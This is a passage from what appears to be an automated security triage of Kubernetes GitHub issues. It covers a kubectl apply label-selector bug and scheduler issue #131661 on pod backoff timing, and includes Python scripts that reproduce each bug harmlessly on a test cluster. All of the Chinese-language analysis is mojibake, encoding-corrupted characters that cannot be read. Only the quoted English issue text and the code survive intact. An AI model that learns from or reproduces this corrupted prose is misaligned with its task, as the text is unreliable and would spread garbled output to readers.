1.  **æƒé™**: åˆ©ç”¨æ­¤é—®é¢˜ä¸éœ€è¦ä»»ä½•ç‰¹æ®Šæƒé™ï¼Œä½†æ‰§è¡Œ `kubectl apply` æ“ä½œæœ¬èº«éœ€è¦ç”¨æˆ·æ‹¥æœ‰å¯¹ç›®æ ‡èµ„æºçš„åˆ›å»º/æ›´æ–°æƒé™ã€‚
2.  **å½±å“**:
    *   **æœºå¯†æ€§ï¼ˆConfidentialityï¼‰**: ä¸æ¶‰åŠã€‚è¯¥ bug ä¸ä¼šå¯¼è‡´ä»»ä½•ä¿¡æ¯æ³„éœ²ã€‚
    *   **å®Œæ•´æ€§ï¼ˆIntegrityï¼‰**: ä¸æ¶‰åŠã€‚è¯¥ bug ä¸ä¼šç¯¡æ”¹æˆ–æŸåä»»ä½•æ•°æ®ã€‚å®ƒåªæ˜¯é˜»æ­¢äº†ä¸€ä¸ªåˆæ³•çš„æ›´æ–°æ“ä½œã€‚
    *   **å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰**: å½±å“éå¸¸æœ‰é™ã€‚å®ƒä»…åœ¨ç”¨æˆ·ä½¿ç”¨ `kubectl apply` å¹¶åŒæ—¶æŒ‡å®š `-f` å’Œ `-l` å‚æ•°æ—¶æ‰ä¼šè§¦å‘ã€‚ç”¨æˆ·æœ‰å¤šç§ç®€å•çš„è§„é¿æ–¹æ³•ï¼Œä¾‹å¦‚ï¼š
        *   ç›´æ¥ä½¿ç”¨ `kubectl apply -f <file>` è€Œä¸åŠ  `-l` é€‰æ‹©å™¨ã€‚
        *   ä¿®æ”¹ YAML æ–‡ä»¶ï¼Œç§»é™¤å€¼ä¸º `null` çš„æ ‡ç­¾æˆ–ç»™å®ƒä¸€ä¸ªç©ºå­—ç¬¦ä¸² `""` çš„å€¼ã€‚
        *   ä½¿ç”¨ `kubectl patch` æˆ– `kubectl edit` ç­‰å…¶ä»–å‘½ä»¤æ¥æ›´æ–°èµ„æºã€‚
    è¿™ç§å½±å“å¯ä»¥è¢«è§†ä¸ºä¸€ç§è½»å¾®çš„æ“ä½œä¸­æ–­ï¼Œè€Œéå…¸å‹çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå› ä¸ºå®ƒä¸ä¼šå½±å“æœåŠ¡æœ¬èº«ï¼Œä¹Ÿä¸ä¼šå½±å“å…¶ä»–ç”¨æˆ·ã€‚

æ ¹æ® CVSS 3.1 è¯„åˆ†æ ‡å‡†ï¼Œè¯¥é—®é¢˜çš„åˆ©ç”¨å¤æ‚æ€§ä¸ºä½ï¼Œéœ€è¦ä¸€å®šæƒé™ï¼ˆapply æƒé™ï¼‰ï¼Œä¸”å¯¹æœºå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§å‡æ— å½±å“ï¼ˆ`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N`ï¼‰ï¼ŒåŸºç¡€å¾—åˆ†ä¸º 0.0ã€‚å› æ­¤ï¼Œå®ƒä¸å±äºå®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import yaml
import time
from kubernetes import client, config, utils
from kubernetes.client.rest import ApiException

# å¤ç°æ­¤é—®é¢˜ä¸éœ€è¦POCï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å·¥å…·çš„bugï¼Œè€Œä¸æ˜¯APIå±‚é¢çš„å®‰å…¨æ¼æ´ã€‚
# æ­¤å¤„æä¾›çš„è„šæœ¬æ—¨åœ¨é€šè¿‡Python Kuberneteså®¢æˆ·ç«¯æ¼”ç¤ºé—®é¢˜çš„æ ¹æºï¼š
# å¸¦æœ‰nullæ ‡ç­¾çš„èµ„æºæœ¬èº«å¯ä»¥è¢«API Serveræ­£å¸¸å¤„ç†ï¼Œä½†kubectlçš„å®¢æˆ·ç«¯è¿‡æ»¤é€»è¾‘å­˜åœ¨ç¼ºé™·ã€‚
# è„šæœ¬å°†æ¨¡æ‹Ÿè¿™ä¸€è¿‡ç¨‹æ¥é˜æ˜é—®é¢˜ã€‚

def main():
    """
    ä¸»æ‰§è¡Œå‡½æ•°
    """
    try:
        # 1. åŠ è½½ kubeconfig é…ç½®ï¼Œå‡è®¾åœ¨é»˜è®¤è·¯å¾„ ~/.kube/config
        config.load_kube_config()
        core_v1_api = client.CoreV1Api()
        print("âœ“ Kubernetes aPI å®¢æˆ·ç«¯åˆå§‹åŒ–æˆåŠŸã€‚")

        # 2. å®šä¹‰åŒ…å« null æ ‡ç­¾çš„ ConfigMap YAML
        namespace = "default"
        configmap_name = "test-config-null-label"
        yaml_content = f"""
apiVersion: v1
kind: ConfigMap
metadata:
  name: {configmap_name}
  namespace: {namespace}
  labels:
    label_a: null
    label_b: "bar"
    app.kubernetes.io/version: "v1.0.0"
data:
  config_key_1: "value1"
"""
        print(f"--- å‡†å¤‡åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­æ“ä½œ ConfigMap '{configmap_name}' ---")
        print("YAML å†…å®¹:")
        print(yaml_content)

        # 3. æ¨¡æ‹Ÿ `kubectl apply -f test_file.yaml`
        # ä½¿ç”¨ Python å®¢æˆ·ç«¯çš„ utils.create_from_yaml ç›´æ¥åº”ç”¨ã€‚
        # è¿™è¯æ˜äº† Kubernetes API Server æœ¬èº«å¯ä»¥æ¥å—å¸¦æœ‰ null æ ‡ç­¾çš„å®šä¹‰ã€‚
        # (æ³¨æ„ï¼šAPI Serveråœ¨å¤„ç†æ—¶å¯èƒ½ä¼šå¿½ç•¥nullå€¼çš„æ ‡ç­¾)
        print("\n>>> æ­¥éª¤ 1: æ¨¡æ‹Ÿ `kubectl apply -f <file>`")
        print("è¿™åº”è¯¥ä¼šæˆåŠŸï¼Œè¡¨æ˜APIæœåŠ¡å™¨å¯ä»¥å¤„ç†æ­¤å¯¹è±¡ã€‚")

        # æ¸…ç†å¯èƒ½å­˜åœ¨çš„æ—§èµ„æº
        try:
            core_v1_api.delete_namespaced_config_map(name=configmap_name, namespace=namespace)
            print(f"å·²åˆ é™¤æ—§çš„ ConfigMap '{configmap_name}'ã€‚")
            time.sleep(2) # ç­‰å¾…èµ„æºåˆ é™¤å®Œæˆ
        except ApiException as e:
            if e.status != 404:
                raise

        utils.create_from_yaml(k8s_client=client.ApiClient(), yaml_objects=[yaml.safe_load(yaml_content)])
        print(f"âœ“ æˆåŠŸåˆ›å»º/åº”ç”¨ ConfigMap '{configmap_name}'ã€‚")

        # éªŒè¯åˆ›å»ºçš„èµ„æº
        cm = core_v1_api.read_namespaced_config_map(name=configmap_name, namespace=namespace)
        print("åˆ›å»ºåçš„èµ„æºæ ‡ç­¾å¦‚ä¸‹:")
        print(cm.metadata.labels)
        # æ³¨æ„: Kubernetes API Server é€šå¸¸ä¼šå¿½ç•¥å€¼ä¸ºnullçš„æ ‡ç­¾ï¼Œæ‰€ä»¥ 'label_a' å¯èƒ½ä¸ä¼šå‡ºç°ã€‚
        # è¿™ä¹Ÿè¯æ˜äº†é—®é¢˜å‡ºåœ¨å®¢æˆ·ç«¯ï¼Œè€ŒéæœåŠ¡ç«¯ã€‚
        if 'label_a' not in cm.metadata.labels:
            print("âœ“ (ç¬¦åˆé¢„æœŸ) API Serveråœ¨åˆ›å»ºèµ„æºæ—¶å¿½ç•¥äº† 'label_a: null'ã€‚")


        # 4. æ¨¡æ‹Ÿ `kubectl apply -f test_file.yaml -l='label_b=bar'` çš„å®¢æˆ·ç«¯è¡Œä¸º
        print("\n>>> æ­¥éª¤ 2: æ¨¡æ‹Ÿ `kubectl apply -f <file> -l 'label_b=bar'` çš„ *å®¢æˆ·ç«¯è¿‡æ»¤* è¡Œä¸º")
        
        # ä»å­—ç¬¦ä¸²åŠ è½½æ‰€æœ‰YAMLæ–‡æ¡£
        resources = list(yaml.safe_load_all(yaml_content))
        selector = {'label_b': 'bar'}
        
        # æ¨¡æ‹Ÿ kubectl çš„ *é”™è¯¯* è¿‡æ»¤é€»è¾‘
        # å¦‚æœä¸€ä¸ªèµ„æºçš„ä»»ä½•æ ‡ç­¾å€¼ä¸º Noneï¼Œåˆ™æ— è®ºå…¶ä»–æ ‡ç­¾æ˜¯å¦åŒ¹é…ï¼Œéƒ½å°†å…¶è¿‡æ»¤æ‰
        def buggy_filter(resource, sel):
            labels = resource.get('metadata', {}).get('labels', {})
            if labels is None:
                return False
            # æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å€¼ä¸º None çš„æ ‡ç­¾
            if any(v is None for v in labels.values()):
                print(f"âœ— èµ„æº '{resource['metadata']['name']}' å› åŒ…å«nullæ ‡ç­¾è€Œè¢«é”™è¯¯åœ°è¿‡æ»¤æ‰äº†ã€‚")
                return False
            # æ£€æŸ¥æ˜¯å¦åŒ¹é…é€‰æ‹©å™¨
            for k, v in sel.items():
                if labels.get(k) != v:
                    return False
            return True

        filtered_resources = [res for res in resources if buggy_filter(res, selector)]

        print("\nåº”ç”¨äº†é”™è¯¯çš„è¿‡æ»¤é€»è¾‘å...")
        if not filtered_resources:
            print("âœ“ å¤ç°æˆåŠŸï¼šè¿‡æ»¤åçš„èµ„æºåˆ—è¡¨ä¸ºç©ºã€‚")
            print("è¿™ä¼šå¯¼è‡´å®¢æˆ·ç«¯å‘ apply å‡½æ•°ä¼ é€’ä¸€ä¸ªç©ºåˆ—è¡¨ï¼Œä»è€Œäº§ç”Ÿ 'error: no objects passed to apply' çš„é”™è¯¯ã€‚")
        else:
            print("âœ— å¤ç°å¤±è´¥ï¼šè¿‡æ»¤åçš„èµ„æºåˆ—è¡¨ä¸ä¸ºç©ºã€‚")

    except Exception as e:
        print(f"è„šæœ¬æ‰§è¡Œå‡ºé”™: {e}")
    finally:
        # 5. æ¸…ç†èµ„æº
        print("\n>>> æ­¥éª¤ 3: æ¸…ç†æµ‹è¯•èµ„æº")
        try:
            core_v1_api = client.CoreV1Api()
            core_v1_api.delete_namespaced_config_map(name=configmap_name, namespace=namespace)
            print(f"âœ“ å·²æˆåŠŸåˆ é™¤ ConfigMap '{configmap_name}'ã€‚")
        except NameError:
             print("API å®¢æˆ·ç«¯æœªåˆå§‹åŒ–ï¼Œæ— éœ€æ¸…ç†ã€‚")
        except ApiException as e:
            if e.status == 404:
                print(f"âœ“ ConfigMap '{configmap_name}' ä¸å­˜åœ¨ï¼Œæ— éœ€æ¸…ç†ã€‚")
            else:
                print(f"âœ— æ¸…ç†èµ„æºæ—¶å‘ç”Ÿé”™è¯¯: {e}")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿° Python è„šæœ¬æ—¨åœ¨å¤ç°å¹¶è§£é‡Š Issue ä¸­æè¿°çš„é—®é¢˜ï¼Œè€Œä¸æ˜¯åˆ©ç”¨ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¥é˜æ˜é—®é¢˜çš„æœ¬è´¨ï¼š

1.  **åˆå§‹åŒ–å®¢æˆ·ç«¯**: è„šæœ¬é¦–å…ˆåŠ è½½æœ¬åœ°çš„ `kubeconfig` æ–‡ä»¶æ¥åˆå§‹åŒ– Kubernetes Python å®¢æˆ·ç«¯ï¼Œä»¥ä¾¿ä¸é›†ç¾¤è¿›è¡Œäº¤äº’ã€‚
2.  **æ¨¡æ‹Ÿ `kubectl apply -f <file>`**: è„šæœ¬ä½¿ç”¨ `kubernetes.utils.create_from_yaml` å‡½æ•°ï¼Œå°†åŒ…å« `label_a: null` çš„ ConfigMap YAML åº”ç”¨åˆ°é›†ç¾¤ã€‚æ­¤æ­¥éª¤ä¼šæˆåŠŸæ‰§è¡Œï¼Œè¯æ˜ Kubernetes API Server æœ¬èº«èƒ½å¤Ÿå¤„ç†ï¼ˆé€šå¸¸æ˜¯å¿½ç•¥ `null` å€¼çš„æ ‡ç­¾ï¼‰æ­¤ç±»èµ„æºã€‚è¿™å°±å°†é—®é¢˜èŒƒå›´ç¼©å°åˆ°äº† `kubectl` å®¢æˆ·ç«¯ã€‚
3.  **æ¨¡æ‹Ÿå®¢æˆ·ç«¯è¿‡æ»¤ç¼ºé™·**: è¿™æ˜¯è„šæœ¬çš„æ ¸å¿ƒã€‚`kubectl apply -f <file> -l <selector>` å‘½ä»¤ä¼šåœ¨å°† YAML å†…å®¹å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰ï¼Œå…ˆåœ¨å®¢æˆ·ç«¯è¿›è¡Œä¸€æ¬¡è¿‡æ»¤ã€‚è„šæœ¬é€šè¿‡ä¸€ä¸ªåä¸º `buggy_filter` çš„å‡½æ•°æ¥æ¨¡æ‹Ÿ `kubectl` çš„é”™è¯¯è¡Œä¸ºï¼š
    *   è¯¥å‡½æ•°æ£€æŸ¥èµ„æºçš„æ‰€æœ‰æ ‡ç­¾ã€‚
    *   ä¸€æ—¦å‘ç°ä»»ä½•ä¸€ä¸ªæ ‡ç­¾çš„å€¼ä¸º `None` (å³YAMLä¸­çš„ `null`)ï¼Œå®ƒå°±ç«‹å³åˆ¤å®šè¯¥èµ„æºä¸åŒ¹é…ï¼Œå¹¶å°†å…¶ä»å¾…åº”ç”¨åˆ—è¡¨ä¸­æ’é™¤ã€‚
    *   è„šæœ¬åº”ç”¨æ­¤è¿‡æ»¤å™¨åï¼Œä¼šå¾—åˆ°ä¸€ä¸ªç©ºçš„èµ„æºåˆ—è¡¨ã€‚
4.  **éªŒè¯å¤ç°**: è„šæœ¬æ–­è¨€è¿‡æ»¤åçš„èµ„æºåˆ—è¡¨ä¸ºç©ºï¼Œå¹¶æ‰“å°ä¿¡æ¯è¯´æ˜è¿™æ­£æ˜¯å¯¼è‡´ `kubectl` æŠ¥é”™ "error: no objects passed to apply" çš„åŸå› ã€‚è¿™æ¸…æ™°åœ°å†ç°äº† Issue ä¸­æè¿°çš„åœºæ™¯ã€‚
5.  **æ¸…ç†èµ„æº**: åœ¨è„šæœ¬çš„æœ€åï¼Œé€šè¿‡ `finally` å—ç¡®ä¿æµ‹è¯•åˆ›å»ºçš„ ConfigMap èµ„æºè¢«åˆ é™¤ï¼Œä¿æŒé›†ç¾¤ç¯å¢ƒçš„æ•´æ´ã€‚

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œè„šæœ¬ä¸ä»…ç¡®è®¤äº†é—®é¢˜çš„å­˜åœ¨ï¼Œè¿˜ä»æ ¹æœ¬ä¸Šè§£é‡Šäº†é—®é¢˜å‘ç”Ÿçš„åŸå› â€”â€”å³ `kubectl` å®¢æˆ·ç«¯åœ¨å¤„ç†å¸¦æœ‰ `null` æ ‡ç­¾çš„èµ„æºæ—¶çš„è¿‡æ»¤é€»è¾‘ç¼ºé™·ï¼Œè€Œéä¸€ä¸ªæœåŠ¡ç«¯æˆ–APIå±‚çš„å®‰å…¨é£é™©ã€‚

---


## Issue #131661 `WithPodMaxBackoffDuration` isn't accurately respected after SchedulerPopFromBackoffQ feature

- Issue é“¾æ¥ï¼š[#131661](https://github.com/kubernetes/kubernetes/issues/131661)

### Issue å†…å®¹

#### What happened?

Let's say you specify `WithPodMaxBackoffDuration(0)`, you would expect the backoff is disabled completely.
However, actually the pods could experience a backoff penalty for ~0.999 seconds.

It's caused by:
https://github.com/kubernetes/kubernetes/blob/a3097010faac734fb4956dbc91ae9034d0a9f840/pkg/scheduler/backend/queue/backoff_queue.go#L211-L212

So, it regards the pod is backing off if `backoffTime == Truncate(now)`.
And, if you specify `WithPodMaxBackoffDuration(0)`, backoffTime would always be `pInfo.Timestamp`, which is when the pod came back to the queue. Meaning, pods is regarded as backing off until ~1 second has passed after the pod came back to the queue because of `Truncate(now)`.

#### What did you expect to happen?

`WithPodMaxBackoffDuration` should be respected as an actual upper limit.
I guess if `WithPodMaxBackoffDuration` is set to non-zero value, users notice this problem less likely. 
But, if it's set to 0, users could notice/be confused because they expect no backoff at all, but logs/metrics would show some pods have experienced backoff.

#### How can we reproduce it (as minimally and precisely as possible)?

Set `WithPodMaxBackoffDuration(0)`, put a pod in the queue via `AddUnschedulableIfNotPresent` (simulating the pod is unschedulable and coming back to the queue), immediately trigger some events that trigger the pod's requeueing, and see logs. 
You should see the pod is going through backoffQ.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

master

</details>


#### Cloud provider

<details>

n/a

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ Kubernetes è°ƒåº¦å™¨ä¸­å­˜åœ¨çš„åŠŸèƒ½æ€§ç¼ºé™·ã€‚å…·ä½“æ¥è¯´ï¼Œå½“è°ƒåº¦å™¨é…ç½®ä¸­ `WithPodMaxBackoffDuration`ï¼ˆæˆ–å…¶ç­‰æ•ˆçš„é…ç½®æ–‡ä»¶å‚æ•° `podMaxBackoffDuration`ï¼‰è¢«è®¾ç½®ä¸º `0` æ—¶ï¼Œç”¨æˆ·çš„é¢„æœŸæ˜¯å®Œå…¨ç¦ç”¨ Pod çš„é€€é¿ï¼ˆbackoffï¼‰æœºåˆ¶ã€‚è¿™æ„å‘³ç€å½“ä¸€ä¸ª Pod å› ä¸ºæ— æ³•è°ƒåº¦è€Œè¢«æ”¾å›é˜Ÿåˆ—æ—¶ï¼Œå®ƒåº”è¯¥èƒ½ç«‹å³è¢«é‡æ–°å°è¯•è°ƒåº¦ã€‚

ç„¶è€Œï¼Œå®é™…æƒ…å†µæ˜¯ï¼Œç”±äºä»£ç ä¸­çš„ä¸€ä¸ªå®ç°ç»†èŠ‚ï¼Œå³ä½¿ç¦ç”¨äº†é€€é¿ï¼ŒPod ä»ç„¶ä¼šç»å†ä¸€ä¸ªæœ€é•¿å¯è¾¾ 1 ç§’çš„å»¶è¿Ÿã€‚é—®é¢˜æ ¹æºåœ¨äºè°ƒåº¦å™¨åœ¨åˆ¤æ–­ä¸€ä¸ª Pod æ˜¯å¦å¤„äºé€€é¿çŠ¶æ€æ—¶çš„é€»è¾‘ã€‚ç›¸å…³ä»£ç ä½¿ç”¨äº† `now.Truncate(time.Second)` å°†å½“å‰æ—¶é—´æˆ³æˆªæ–­åˆ°ç§’çº§ï¼Œç„¶åä¸ Pod è¿›å…¥é˜Ÿåˆ—æ—¶è®°å½•çš„ã€å…·æœ‰çº³ç§’ç²¾åº¦çš„æ—¶é—´æˆ³ï¼ˆ`pInfo.Timestamp`ï¼‰è¿›è¡Œæ¯”è¾ƒã€‚

å…·ä½“é€»è¾‘å¦‚ä¸‹ï¼š
1.  å½“ `podMaxBackoffDuration` ä¸º 0 æ—¶ï¼ŒPod çš„é€€é¿æ—¶é—´ï¼ˆ`backoffTime`ï¼‰è¢«è®¾ç½®ä¸ºå®ƒè¿›å…¥é˜Ÿåˆ—çš„æ—¶é—´æˆ³ `pInfo.Timestamp`ã€‚
2.  è°ƒåº¦å™¨æ£€æŸ¥ Pod æ˜¯å¦åº”é€€é¿çš„æ¡ä»¶ç±»ä¼¼äº `now.Truncate(time.Second).Before(pInfo.Timestamp)`ã€‚
3.  å‡è®¾ä¸€ä¸ª Pod åœ¨ `10:00:00.500` è¿™ä¸ªæ—¶é—´ç‚¹è¿›å…¥é˜Ÿåˆ—ï¼Œå®ƒçš„ `pInfo.Timestamp` å°±æ˜¯è¿™ä¸ªå€¼ã€‚
4.  åœ¨åŒä¸€ç§’å†…ï¼ˆä¾‹å¦‚ `10:00:00.800`ï¼‰ï¼Œè°ƒåº¦å™¨è¿›è¡Œæ£€æŸ¥ã€‚æ­¤æ—¶ `now.Truncate(time.Second)` çš„ç»“æœæ˜¯ `10:00:00.000`ã€‚
5.  `10:00:00.000` æ—©äº (`Before`) `10:00:00.500`ï¼Œæ¡ä»¶ä¸ºçœŸï¼Œå› æ­¤è°ƒåº¦å™¨è®¤ä¸ºè¯¥ Pod ä»åœ¨é€€é¿ä¸­ï¼Œä¸ä¼šç«‹å³é‡æ–°è°ƒåº¦ã€‚
6.  è¿™ç§æƒ…å†µä¼šä¸€ç›´æŒç»­åˆ°ä¸‹ä¸€ç§’ï¼Œä¾‹å¦‚ `10:00:01.100`ã€‚æ­¤æ—¶ `now.Truncate(time.Second)` çš„ç»“æœæ˜¯ `10:00:01.000`ã€‚
7.  `10:00:01.000` å¹¶ä¸æ—©äº `10:00:00.500`ï¼Œæ¡ä»¶ä¸ºå‡ï¼ŒPod æ‰è¢«è®¤ä¸ºä¸å†é€€é¿ï¼Œå¯ä»¥è¢«é‡æ–°è°ƒåº¦ã€‚

è¿™ä¸ªé€»è¾‘å¯¼è‡´äº† Pod åœ¨è¢«æ ‡è®°ä¸ºä¸å¯è°ƒåº¦åçš„é‚£ä¸€ç§’å†…ï¼Œæ— æ³•è¢«ç«‹å³é‡è¯•ï¼Œä»è€Œäº§ç”Ÿäº†ä¸€ä¸ªéé¢„æœŸçš„ã€æœ€å¤š1ç§’çš„è°ƒåº¦å»¶è¿Ÿã€‚

æ­¤é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bugï¼Œå®ƒè¿åäº†é…ç½®å‚æ•°çš„é¢„æœŸè¡Œä¸ºã€‚ä»å®‰å…¨è§’åº¦çœ‹ï¼Œå®ƒå¯èƒ½å¯¼è‡´è½»å¾®çš„å¯ç”¨æ€§é—®é¢˜ï¼ˆæœåŠ¡å»¶è¿Ÿï¼‰ï¼Œä½†æ— æ³•è¢«åˆ©ç”¨äºå‘èµ·æœ‰æ•ˆçš„æ‹’ç»æœåŠ¡æ”»å‡»ã€æƒé™æå‡æˆ–ä¿¡æ¯æ³„éœ²ã€‚æ”»å‡»è€…å³ä½¿èƒ½å¤Ÿåˆ›å»º Podï¼Œä¹Ÿåªèƒ½å¯¹è‡ªå·±åˆ›å»ºçš„ Pod é€ æˆè¿™æœ€å¤š1ç§’çš„å»¶è¿Ÿï¼Œå¯¹æ•´ä¸ªé›†ç¾¤æˆ–å…¶ä»–ç”¨æˆ·çš„å½±å“å¾®ä¹å…¶å¾®ã€‚å› æ­¤ï¼Œè¯¥é—®é¢˜ä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import datetime
import sys
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException

def demonstrate_backoff_issue():
    """
    è¯¥è„šæœ¬ç”¨äºè¾…åŠ©éªŒè¯ Kubernetes Scheduler çš„ backoff ç¼ºé™·ã€‚
    å®ƒä¼šåˆ›å»ºä¸€ä¸ªæ— æ³•è¢«è°ƒåº¦çš„ Podï¼Œå¹¶ç›‘æ§å…¶ "FailedScheduling" äº‹ä»¶ä¹‹é—´çš„æ—¶é—´é—´éš”ã€‚
    """
    # --- å‰ç½®æ¡ä»¶è¯´æ˜ ---
    print("--- å‰ç½®æ¡ä»¶ ---")
    print("æœ¬è„šæœ¬éœ€è¦åœ¨ä¸€ä¸ªå·²ç»é…ç½®äº† kube-scheduler çš„ Kubernetes é›†ç¾¤ä¸Šè¿è¡Œã€‚")
    print("ä¸ºäº†å¤ç°è¯¥é—®é¢˜ï¼Œæ‚¨å¿…é¡»æ‰‹åŠ¨ä¿®æ”¹ kube-scheduler çš„é…ç½®ï¼Œå°† 'podMaxBackoffDuration' è®¾ç½®ä¸º '0s'ã€‚")
    print("å¯¹äº kubeadm å®‰è£…çš„é›†ç¾¤ï¼Œé€šå¸¸éœ€è¦ç¼–è¾‘ /etc/kubernetes/manifests/kube-scheduler.yaml æ–‡ä»¶ï¼Œ")
    print("åœ¨ 'command' éƒ¨åˆ†æ·»åŠ ä¸€è¡Œ: '--pod-max-backoff-duration=0s'ï¼Œç„¶åç­‰å¾… scheduler é‡å¯ã€‚")
    print("å¦‚æœé…ç½®æ­£ç¡®ï¼Œé¢„æœŸç»“æœæ˜¯ 'FailedScheduling' äº‹ä»¶ä¹‹é—´çš„æ—¶é—´é—´éš”éå¸¸å°ï¼ˆæ¯«ç§’çº§ï¼‰ã€‚")
    print("å¦‚æœå­˜åœ¨è¯¥ Issue ä¸­æè¿°çš„ç¼ºé™·ï¼Œæ‚¨å°†è§‚å¯Ÿåˆ°äº‹ä»¶é—´éš”çº¦ç­‰äº1ç§’ã€‚")
    print("-" * 20)
    input("è¯·ç¡®è®¤å·²å®Œæˆä¸Šè¿°é…ç½®ã€‚æŒ‰ Enteré”®ç»§ç»­...")

    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        config.load_kube_config()
        api = client.CoreV1Api()
        namespace = "default"
        pod_name = f"unschedulable-pod-{int(time.time())}"
        
        print(f"\n[INFO] å°†åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»ºæ— æ³•è°ƒåº¦çš„ Pod '{pod_name}'...")

        # å®šä¹‰ä¸€ä¸ªèµ„æºéœ€æ±‚æé«˜ï¼Œæ— æ³•è¢«ä»»ä½•èŠ‚ç‚¹æ»¡è¶³çš„ Pod
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {"name": pod_name},
            "spec": {
                "containers": [
                    {
                        "name": "main",
                        "image": "registry.k8s.io/pause:3.9",
                        "resources": {"requests": {"cpu": "99999"}}, # æ— æ³•æ»¡è¶³çš„CPUè¯·æ±‚
                    }
                ]
            },
        }

        api.create_namespaced_pod(body=pod_manifest, namespace=namespace)
        print(f"[INFO] Pod '{pod_name}' å·²åˆ›å»ºã€‚")

    except ApiException as e:
        print(f"[ERROR] åˆ›å»º Pod å¤±è´¥: {e}", file=sys.stderr)
        return
    except Exception as e:
        print(f"[ERROR] K8s é…ç½®åŠ è½½å¤±è´¥ï¼Œè¯·ç¡®ä¿ kubeconfig é…ç½®æ­£ç¡®: {e}", file=sys.stderr)
        return

    w = watch.Watch()
    event_timestamps = []
    start_time = time.time()
    timeout = 120  # 2åˆ†é’Ÿè¶…æ—¶

    print(f"\n[INFO] å¼€å§‹ç›‘æ§ '{pod_name}' çš„ 'FailedScheduling' äº‹ä»¶... (å°†æŒç»­çº¦ {timeout} ç§’)")

    try:
        # ç›‘æ§ä¸è¯¥ Pod ç›¸å…³çš„äº‹ä»¶
        for event in w.stream(api.list_namespaced_event, namespace=namespace, timeout_seconds=timeout):
            if (event['object'].involved_object.name == pod_name and 
                event['object'].reason == "FailedScheduling"):
                
                # event.creation_timestamp is a datetime object
                event_time = event['object'].creation_timestamp
                print(f"[EVENT] åœ¨ {event_time.isoformat()} æ•è·åˆ° 'FailedScheduling' äº‹ä»¶ã€‚")
                
                if event_timestamps:
                    last_event_time = event_timestamps[-1]
                    delta = (event_time - last_event_time).total_seconds()
                    print(f"      -> ä¸ä¸Šæ¬¡äº‹ä»¶çš„æ—¶é—´é—´éš”: {delta:.4f} ç§’")
                    # å¦‚æœç¼ºé™·å­˜åœ¨ï¼Œè¿™ä¸ªé—´éš”ä¼šæ¥è¿‘1ç§’
                    if 0.8 < delta < 1.2:
                         print("      -> [!!] è§‚å¯Ÿåˆ°çš„é—´éš”æ¥è¿‘1ç§’ï¼Œå¯èƒ½è¡¨æ˜ç¼ºé™·å­˜åœ¨ã€‚")
                    else:
                         print("      -> è§‚å¯Ÿåˆ°çš„é—´éš”ä¸æ¥è¿‘1ç§’ã€‚")

                event_timestamps.append(event_time)

            if time.time() - start_time > timeout:
                print("\n[INFO] ç›‘æ§è¶…æ—¶ã€‚")
                break
    except Exception as e:
        print(f"\n[ERROR] ç›‘æ§äº‹ä»¶æ—¶å‘ç”Ÿé”™è¯¯: {e}", file=sys.stderr)
    finally:
        # æ¸…ç†èµ„æº
        print(f"\n[INFO] æ¸…ç†èµ„æºï¼Œåˆ é™¤ Pod '{pod_name}'...")
        try:
            api.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
            print(f"[INFO] Pod '{pod_name}' å·²æˆåŠŸåˆ é™¤ã€‚")
        except ApiException as e:
            # Podå¯èƒ½å·²ç»å› ä¸ºæŸäº›åŸå› è¢«åˆ é™¤äº†
            if e.status != 404:
                print(f"[ERROR] åˆ é™¤ Pod '{pod_name}' å¤±è´¥: {e}", file=sys.stderr)
        
        # ç»“æœæ€»ç»“
        print("\n--- ç»“æœåˆ†æ ---")
        if len(event_timestamps) < 2:
            print("æœªèƒ½æ•è·åˆ°è¶³å¤Ÿå¤šçš„ 'FailedScheduling' äº‹ä»¶ä»¥è¿›è¡Œåˆ†æã€‚")
            print("è¿™å¯èƒ½æ˜¯å› ä¸ºé›†ç¾¤è´Ÿè½½ä½ï¼Œè°ƒåº¦å™¨æ²¡æœ‰é¢‘ç¹é‡è¯•ã€‚")
        else:
            print("å·²å®Œæˆäº‹ä»¶é—´éš”åˆ†æã€‚è¯·æ£€æŸ¥ä¸Šé¢çš„è¾“å‡ºæ—¥å¿—ã€‚")
            print("å¦‚æœæ—¶é—´é—´éš”æ™®éæ¥è¿‘ 1.0 ç§’ï¼Œåˆ™è¯´æ˜è¯¥ Issue æè¿°çš„ç¼ºé™·å¾ˆå¯èƒ½å­˜åœ¨äºæ‚¨çš„é›†ç¾¤ä¸­ã€‚")
